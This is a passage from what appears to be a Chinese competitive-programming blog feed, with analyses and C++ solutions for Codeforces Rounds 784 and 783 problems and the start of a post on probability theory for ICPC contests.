<span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="G-Fall-Down"><a href="#G-Fall-Down" class="headerlink" title="G. Fall Down"></a>G. Fall Down</h2><h3 id="题目描述-6"><a href="#题目描述-6" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/04/22/Codeforces%20Round%20784(Div.4)/7.png" alt="7"></p><h3 id="题目分析-6"><a href="#题目分析-6" class="headerlink" title="题目分析"></a>题目分析</h3><p>模拟题，直接按要求下落石块就行，注意判断一下下落条件即可。</p><h3 id="标程-6"><a href="#标程-6" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">map&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;ma;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">55</span>][<span class="number">55</span>];</span><br><span class="line"><span class="keyword">int</span> n,m;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fall</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">    <span class="comment">//a[y++][x];</span></span><br><span class="line">    <span class="keyword">while</span>(y!=n&amp;&amp;a[y+<span class="number">1</span>][x]==<span class="string">&#x27;.&#x27;</span>)&#123;</span><br><span class="line">        a[y][x]=<span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">        y++;</span><br><span class="line">        a[y][x]=<span class="string">&#x27;*&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m;</span><br><span class="line">    string s;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;s;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=m;j++)&#123;</span><br><span class="line">            a[i][j]=s[j<span class="number">-1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=n<span class="number">-1</span>;i&gt;=<span class="number">1</span>;i--)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=m;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(a[i][j]==<span class="string">&#x27;*&#x27;</span>)&#123;</span><br><span class="line">                <span class="built_in">fall</span>(j,i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=m;j++)&#123;</span><br><span class="line">            <span class="built_in">putchar</span>(a[i][j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="H-Maximal-AND"><a href="#H-Maximal-AND" class="headerlink" title="H. Maximal AND"></a>H. Maximal AND</h2><h3 id="题目描述-7"><a href="#题目描述-7" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/04/22/Codeforces%20Round%20784(Div.4)/8.png" alt="8"></p><h3 id="题目分析-7"><a href="#题目分析-7" class="headerlink" title="题目分析"></a>题目分析</h3><p>有k次机会让某一个数的二进制位变成1，最后求所有数的与最大值。我们直接统计所有位的情况，从最高位开始，如果当前k的值允许变为全1则直接给了，然后答案加上那一位即可。</p><h3 id="标程-7"><a href="#标程-7" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">map&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;ma;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">60</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_bit</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(x)&#123;</span><br><span class="line">        <span class="keyword">if</span>(x&amp;<span class="number">1</span>)&#123;</span><br><span class="line">            a[i]++;</span><br><span class="line">        &#125;</span><br><span class="line">        x&gt;&gt;=<span class="number">1</span>;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,k;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;k;</span><br><span class="line">    <span class="built_in">memset</span>(a,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(a));</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> x;</span><br><span class="line">        cin&gt;&gt;x;</span><br><span class="line">        <span class="built_in">get_bit</span>(x);</span><br><span class="line">        <span class="comment">//puts(&quot;1&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">30</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">        <span class="keyword">if</span>(k&gt;=n-a[i])&#123;</span><br><span class="line">            k-=n-a[i];</span><br><span class="line">            ans|=(<span class="number">1</span>&lt;&lt;i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一次在cf上ak，也算成功吧，虽然都挺简单的hhh。</p><p><img src="/2022/04/22/Codeforces%20Round%20784(Div.4)/9.png" alt="9"></p>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> codeforces </category>
          
          <category> 签到 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Codeforces Round 783(Div.2)解析</title>
      <link href="/2022/04/20/Codeforces%20Round%20783(Div.2)/"/>
      <url>/2022/04/20/Codeforces%20Round%20783(Div.2)/</url>
      
        <content type="html"><![CDATA[<p><a href="https://codeforces.com/contest/1668">Codeforces Round #783 (Div. 2)</a></p><span id="more"></span><h2 id="A-Direction-Change"><a href="#A-Direction-Change" class="headerlink" title="A. Direction Change"></a>A. Direction Change</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/04/20/Codeforces%20Round%20783(Div.2)/1.png" alt="1"></p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>不难发现，我最优的路线只能是向右或者向下走。我先不妨设 $m\ge n$，如果走到底了，不得以我只能向上转变方向然后再右下，这样循环走直到终点，只考虑到了最后一行的情况，不难发现，每次长度+1变为奇数时，走的步数+1，否则+3。最后特判一下走不了的情况，当只有一行且有超过2列的情况为走不了。</p><h3 id="标程"><a href="#标程" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,m;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m;</span><br><span class="line">    <span class="keyword">if</span>(n&gt;m)&#123;<span class="comment">//m&gt;n</span></span><br><span class="line">        <span class="built_in">swap</span>(n,m);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(n==<span class="number">1</span>&amp;&amp;m&gt;<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;-1&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    ans+=<span class="number">2</span>*n<span class="number">-2</span>;</span><br><span class="line">    m-=n;</span><br><span class="line">    <span class="keyword">if</span>(m==<span class="number">0</span>)&#123;</span><br><span class="line">        ans+=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(m%<span class="number">2</span>==<span class="number">0</span>)&#123;</span><br><span class="line">            ans+=<span class="number">2</span>*m;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            ans+=<span class="number">2</span>*m<span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans);</span><br><span class="line">    </span><br><span class="line">     </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="B-Social-Distance"><a href="#B-Social-Distance" class="headerlink" title="B.Social Distance"></a>B.Social Distance</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/04/20/Codeforces%20Round%20783(Div.2)/2.png" alt="2"></p><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>n个人要做在m把椅子上，每个人对自己有要求，要求左右两边必须有一定数目把空椅子。这个交错两发，后面发现这些人不是按顺序坐的，可以随意排，那么不难发现我们可以对要求从小到大排序然后相邻之间的要求取max最后取和得到一个值与m比较即可。</p><h3 id="标程-1"><a href="#标程-1" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">1000006</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,m;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(n==<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(a[<span class="number">1</span>]+<span class="number">1</span>&gt;m)&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;YES&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">sort</span>(a+<span class="number">1</span>,a+<span class="number">1</span>+n);</span><br><span class="line">    </span><br><span class="line">    a[<span class="number">0</span>]=a[n];</span><br><span class="line">    <span class="keyword">int</span> ans=n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        ans+=<span class="built_in">max</span>(a[i],a[i<span class="number">-1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(ans&lt;=m)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;YES&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//printf(&quot;%d\n&quot;,ans);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C-Make-it-Increasing"><a href="#C-Make-it-Increasing" class="headerlink" title="C. Make it Increasing"></a>C. Make it Increasing</h2><h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/04/20/Codeforces%20Round%20783(Div.2)/3.png" alt="3"></p><h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h3><p>给定一个初始值全为0的数组，每个位置可以固定加或减一定的值，要求序列严格递增，求最少操作次数。对于这个问题只需要抓住一个重点：那就是谁为0，根据给定的 $n&lt;5000$ 基本可以判断出来这个要 $O(n^2)$ 的算法。我们只需要循环把一个数强制设置为0，然后0往左边递减，往右边递增，这里我也可以往左边递增，因为减去和加上差不多的嘛，我加上让它递增和减去让它递减是差不多的。</p><h3 id="标程-2"><a href="#标程-2" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">5005</span>];</span><br><span class="line"><span class="keyword">int</span> b[<span class="number">5005</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,m;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(n==<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;0&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> res=<span class="number">0x7fffffffffffffff</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;<span class="comment">//zero</span></span><br><span class="line">        <span class="built_in">memset</span>(b,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(b));</span><br><span class="line">        <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=i<span class="number">-1</span>;j&gt;=<span class="number">1</span>;j--)&#123;</span><br><span class="line">            <span class="keyword">int</span> k=<span class="built_in">ceil</span>((<span class="keyword">double</span>)(b[j+<span class="number">1</span>]+<span class="number">1</span>)/a[j]);</span><br><span class="line">            ans+=k;</span><br><span class="line">            b[j]=k*a[j];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=i+<span class="number">1</span>;j&lt;=n;j++)&#123;</span><br><span class="line">            <span class="keyword">int</span> k=<span class="built_in">ceil</span>((<span class="keyword">double</span>)(b[j<span class="number">-1</span>]+<span class="number">1</span>)/a[j]);</span><br><span class="line">            ans+=k;</span><br><span class="line">            b[j]=k*a[j];</span><br><span class="line">        &#125;</span><br><span class="line">        res=<span class="built_in">min</span>(res,ans);</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,res);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    <span class="comment">//cin&gt;&gt;t;</span></span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当时也有点没注意到就是数值可能很大，大到超过int，当时初值我只给了0x7fffffff就wa了一发。</p><p>这场比赛失误了很多吧，不过最后还得感谢大自然的馈赠，写了一个明显有问题的程序让我hack了，没至于让我掉太多分。</p><p><img src="/2022/04/20/Codeforces%20Round%20783(Div.2)/4.png" alt="4"></p><p>继续加油吧，上分之路还很漫长。</p>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> codeforces </category>
          
          <category> 思维 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>概率论在icpc的应用</title>
      <link href="/2022/04/18/%E6%A6%82%E7%8E%87%E8%AE%BA%E5%9C%A8icpc%E7%9A%84%E5%BA%94%E7%94%A8/"/>
      <url>/2022/04/18/%E6%A6%82%E7%8E%87%E8%AE%BA%E5%9C%A8icpc%E7%9A%84%E5%BA%94%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>昆明打铁之后，痛定思痛，来重修概率论了。</p><span id="more"></span><h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="样本空间、事件和概率"><a href="#样本空间、事件和概率" class="headerlink" title="样本空间、事件和概率"></a>样本空间、事件和概率</h2><p><strong>样本空间</strong> S 是一个集合，它的元素称为<strong>基本事件</strong>。样本空间的一个子集被称为事件， 根据定义，所有基本事件<strong>互斥</strong>。</p><p><strong>互斥事件</strong>：若事件 A 发生<strong>一定</strong>能推导出 B 不发生，B 发生<strong>一定</strong>能推导出A不发生，则称 A，B 互斥，不难得出，两个事件同时发生的概率为 0，至少发生其中一个事件的概率为两者概率之和（概率公理3）。这个理论可以推导到 n 个事件，若有 n 个<strong>两两互斥</strong>事件 $a_1,a_2…a_n$，则任意两个事件同时发生的概率为 0，任意发生一个事件的概率就为 $\sum _{i=1}^n a_i$ 。</p><p><strong>概率公理</strong>：</p><ol><li>对于任意事件 A，事件发生的概率满足 $0\le P{A}\le1$</li><li>对于样本空间 S，有$P{S}=1$</li><li>对于两个互斥事件 A，B，有 $P{A∪B}=P{A}+P{B}$</li></ol><h2 id="随机变量"><a href="#随机变量" class="headerlink" title="随机变量"></a>随机变量</h2><p>如果对样本空间 S 中的任意事件 e，都有<strong>唯一</strong>的实数 <strong>X(e)</strong> 与之对应，则称 <strong>X=X(e)</strong> 为样 本空间 S 上的随机变量。这个随机变量怎么理解呢，首先看下面这张图：</p><p><img src="/2022/04/18/%E6%A6%82%E7%8E%87%E8%AE%BA%E5%9C%A8icpc%E7%9A%84%E5%BA%94%E7%94%A8/1.png" alt="1"></p><p>还不能理解的话，就举个栗子，如果掷一个骰子，那么它的样本空间为 **{1,2,3,4,5,6}**，把它一次掷骰子出的点数作为一个随机变量的话，那么很    容易得到映射 X 就是一个普通的 $X(e)=e$，或者说，随机变量为样本点 e 的函数，以样本点为自变量，确定一个对应关系得到的应变量就是一个随机变量。</p><p>其中<strong>离散型随机变量</strong>和<strong>连续型随机变量</strong>比较常见。</p><h3 id="离散型随机变量及其概率分布"><a href="#离散型随机变量及其概率分布" class="headerlink" title="离散型随机变量及其概率分布"></a>离散型随机变量及其概率分布</h3><p>离散型随机变量取值范围为<strong>有限可数</strong>或者<strong>无限可数</strong>，或者说取值范围不在实数范围内连续。设离散型随机变量 X 的取值为 $\text{x}_i$ 时的概率为 $p_i(i=1,2…)$，则称 X 的所有取值及其概率为随机变量 X 的概率分布。离散型变量常见的分布有两点分布，二项分布，几何分布，超几何分布，泊松分布。</p><h3 id="连续性随机变量及其概率分布"><a href="#连续性随机变量及其概率分布" class="headerlink" title="连续性随机变量及其概率分布"></a>连续性随机变量及其概率分布</h3><p>如果 X 是在实数域或区间上<strong>取连续值</strong>的随机变量，设 X 的概率分布函数为 $F(x)=P{X\le x}$，若存在非负可积函数 